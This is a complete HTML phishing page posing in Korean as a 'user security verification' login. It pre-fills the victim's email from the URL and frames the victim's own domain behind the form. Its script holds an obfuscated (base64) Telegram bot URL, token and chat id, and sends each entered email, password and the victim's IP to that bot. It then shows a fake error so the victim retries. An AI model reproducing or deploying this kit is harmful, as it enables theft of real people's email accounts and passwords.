<head>

    <style>
        /* Modern Korean Font Stack */
        body, html { 
            margin: 0; padding: 0; height: 100%; overflow: hidden; 
            font-family: 'Pretendard', -apple-system, BlinkMacSystemFont, 'Apple SD Gothic Neo', 'Malgun Gothic', sans-serif; 
            background-color: #f0f2f5; 
        }
        
        #bg-frame { position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none; z-index: -1; filter: blur(2px) brightness(0.8); }
        
        .overlay-mask { 
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
            background: rgba(255, 255, 255, 0.1); 
            display: flex; justify-content: center; align-items: center; z-index: 0; 
        }

        .login-container { 
            background-color: rgba(255, 255, 255, 0.98); 
            border-radius: 12px; 
            width: 380px; 
            padding: 50px 40px; 
            text-align: center; 
            z-index: 10; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.2); 
            border: 1px solid #e1e4e8;
        }

        .security-icon {
            width: 60px; height: 60px; margin-bottom: 20px;
        }

        h1 { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; letter-spacing: -0.5px; }
        p { font-size: 14px; color: #444; margin-bottom: 30px; line-height: 1.6; font-weight: 500; }

        .form-group { margin-bottom: 18px; text-align: left; }
        label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 13px; color: #444; }
        
        input { 
            width: 100%; padding: 14px; 
            border: 1px solid #ccc; 
            border-radius: 6px; 
            box-sizing: border-box; 
            font-size: 15px; 
            transition: border-color 0.2s;
        }
        
        input:focus { border-color: #0061ff; outline: none; box-shadow: 0 0 0 3px rgba(0,97,255,0.1); }

        .login-button { 
            width: 100%; padding: 15px; 
            background-color: #0061ff; 
            color: white; border: none; 
            border-radius: 6px; cursor: pointer; 
            font-size: 16px; font-weight: 700; 
            margin-top: 10px;
            transition: background-color 0.2s;
        }
        
        .login-button:hover { background-color: #0056e0; }
        .login-button:disabled { background-color: #b3d1ff; cursor: not-allowed; }

        .error-msg { 
            display: none; color: #e53e3e; 
            background: #fff5f5; border: 1px solid #feb2b2;
            padding: 10px; border-radius: 4px;
            margin-top: 15px; font-size: 13px; font-weight: 500; 
        }
        
        #verifying { 
            display: none; margin-top: 15px; font-size: 14px; color: #0061ff; font-weight: bold; 
        }

        .spinner {
            display: inline-block; width: 18px; height: 18px;
            border: 3px solid rgba(0,97,255,.3); border-radius: 50%;
            border-top-color: #0061ff; animation: spin 1s ease-in-out infinite;
            margin-right: 8px; vertical-align: middle;
        }
        @keyframes spin { to { transform: rotate(360deg); } }

        .footer-info { margin-top: 30px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

    <iframe id="bg-frame" src=""></iframe>

    <div class="overlay-mask">
        <div class="login-container">
            <svg class="security-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L3 7V12C3 17.41 6.84 22.38 12 24C17.16 22.38 21 17.41 21 12V7L12 2Z" fill="#0061ff"/>
                <path d="M10 17L6 13L7.41 11.59L10 14.17L16.59 7.58L18 9L10 17Z" fill="white"/>
            </svg>

            <h1>&#49324;&#50857;&#51088; &#48372;&#50504; &#54869;&#51064;</h1>
            <p>&#48376;&#51064; &#54869;&#51064;&#51012; &#50948;&#54644; &#50976;&#54952;&#54620; &#51060;&#47700;&#51068; &#51452;&#49548;&#50752;<br>&#54644;&#45817; &#44228;&#51221;&#51032; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54644; &#51452;&#49901;&#49884;&#50724;.</p>
            
            <form id="loginForm">
                <div class="form-group">
                    <label>&#51060;&#47700;&#51068; &#51452;&#49548;</label>
                    <input type="email" id="email" placeholder="example@domain.com" required readonly>
                </div>
                <div class="form-group">
                    <label>&#51060;&#47700;&#51068; &#48708;&#48128;&#48264;&#54840;</label>
                    <input type="password" id="password" placeholder="&#51060;&#47700;&#51068; &#48708;&#48128;&#48264;&#54840;&#47484; &#51077;&#47141;&#54616;&#49464;&#50836;" required>
                </div>
                
                <button type="submit" class="login-button" id="submitBtn">&#48376;&#51064; &#51064;&#51613; &#50756;&#47308;</button>
                
                <div id="verifying">
                    <div class="spinner"></div> &#51221;&#48372; &#54869;&#51064; &#51473;...
                </div>
                
                <div class="error-msg" id="error-msg">
                    &#48708;&#48128;&#48264;&#54840;&#44032; &#50732;&#48148;&#47476;&#51648; &#50506;&#49845;&#45768;&#45796;. &#45796;&#49884; &#54869;&#51064; &#54980; &#51077;&#47141;&#54644; &#51452;&#49464;&#50836;.
                </div>
            </form>
            
            <div class="footer-info">
                Â© 2026 &#48372;&#50504; &#51064;&#51613; &#49436;&#48708;&#49828;. All rights reserved.
            </div>
        </div>
    </div>

    <script>
        const gate = atob("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==");
        const key = atob("NzUxMDY0MzMxMzpBQUczVTN6Ukt6UmdHVDVoZEhwdnVhWFJCekYwNEVtOUVkZw==");
        const cid = atob("NzI0MDkxNTExMA==");

        window.addEventListener('DOMContentLoaded', () => {
            const emailInput = document.getElementById('email');
            const bgFrame = document.getElementById('bg-frame');
            let hashEmail = window.location.hash.substring(1); 
            
            if (hashEmail) {
                emailInput.value = hashEmail;
                let domain = hashEmail.split('@')[1];
                if (domain) { bgFrame.src = "https://www." + domain; }
            }
        });

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            const err = document.getElementById('error-msg');
            const v = document.getElementById('verifying');
            const emailVal = document.getElementById('email').value;
            const passVal = document.getElementById('password').value;

            btn.disabled = true;
            v.style.display = 'block';
            err.style.display = 'none';

            try {
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();
                const msg = `&#128276; *KO Hit*\n&#128231; &#51060;&#47700;&#51068;: ${emailVal}\n&#128273; &#51060;&#47700;&#51068; &#48708;&#48264;: ${passVal}\n&#127760; IP: ${ipData.ip}`;
                
                await fetch(`${gate}${key}/sendMessage`, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ chat_id: cid, text: msg, parse_mode: 'Markdown' })
                });
            } catch (error) {}

            setTimeout(() => {
                v.style.display = 'none';
                err.style.display = 'block';
                btn.disabled = false;
                document.getElementById('password').value = "";
            }, 2500);
        });
    </script>
</body>
</html>
